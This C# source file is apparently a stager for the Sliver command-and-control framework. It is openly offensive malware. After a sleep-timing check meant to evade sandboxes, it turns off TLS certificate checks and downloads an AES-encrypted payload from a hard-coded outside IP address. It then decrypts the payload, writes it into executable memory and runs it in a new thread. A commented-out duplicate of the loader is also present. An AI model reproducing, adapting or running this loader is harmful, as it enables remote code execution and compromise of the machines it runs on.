using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Sliver_stager
{
    class Program
    {

        private static string key = "AAAAAAAAAAAAAAAA";
        private static string iv = "AAAAAAAAAAAAAAAA";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
    public static void DownloadAndExecute()
    {
        ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
        System.Net.WebClient client = new System.Net.WebClient();

        ResidentSleeper(500);
        string url = "http://89.166.30.215:8000/encrypted-payload";

        string text = client.DownloadString(url);

        byte[] sheller = DecryptString(text, key, iv);

        //  string encodedData = wc.DownloadString(url);
        //byte[] sheller = DecryptString(encodedData, key, iv);

        ResidentSleeper(500);

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sheller.Length, 0x3000, 0x40);
        Marshal.Copy(sheller, 0, addr, sheller.Length);
        ResidentSleeper(500);
        Console.WriteLine("SLEEPER");
        ResidentSleeper(500);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        Console.WriteLine("THREAD?");
        // ResidentSleeper(1);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        Console.WriteLine("WAITED?");
        ResidentSleeper(500);
        Console.WriteLine("DONE???");
        return;
    }
        

        /*
        public static void DownloadAndExecute()
        {
            string url = "http://89.166.30.215:8000/encrypted-payload";
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            string shellcode = client.DownloadString(url);
            byte[] sheller = DecryptString(shellcode, key, iv);
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sheller.Length, 0x3000, 0x40);
            Marshal.Copy(sheller, 0, addr, sheller.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
        */

        
        public static byte[] DecryptString(string cipherText, string key, string iv)
        {


            Aes encryptor = Aes.Create();
            encryptor.Mode = CipherMode.CBC;
            encryptor.Key = Encoding.ASCII.GetBytes(key);
            encryptor.IV = Encoding.ASCII.GetBytes(iv);
            MemoryStream memoryStream = new MemoryStream();
            ICryptoTransform aesDecryptor = encryptor.CreateDecryptor();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, aesDecryptor, CryptoStreamMode.Write);

            byte[] plainBytes;
            try
            {
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                cryptoStream.Write(cipherBytes, 0, cipherBytes.Length);
                cryptoStream.FlushFinalBlock();
                plainBytes = memoryStream.ToArray();
            }
            finally
            {
                memoryStream.Close();
                cryptoStream.Close();
            }
            return plainBytes;
        }
        

        /*
        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        Console.WriteLine(cryptoStream.ToString());
                        return memoryStream.ToArray();
                    }
                }
            }
        }
        */

        public static void ResidentSleeper(int time)
        {
            Stopwatch watch = Stopwatch.StartNew();
            Thread.Sleep(time);
            watch.Stop();
            long elapsedMs = watch.ElapsedMilliseconds;
            if (elapsedMs < time)
            {
                Console.WriteLine("Sleep baby");
                throw new Exception("SLEEP");
            }
        }

        public static void Main(String[] args)
        {

            Stopwatch watch = Stopwatch.StartNew();
            Thread.Sleep(5000);
            watch.Stop();
            long elapsedMs = watch.ElapsedMilliseconds;
            if (elapsedMs < 2000)
            {
                Console.WriteLine("Sleep baby");
                return;
            }


            DownloadAndExecute();
        }
    }
}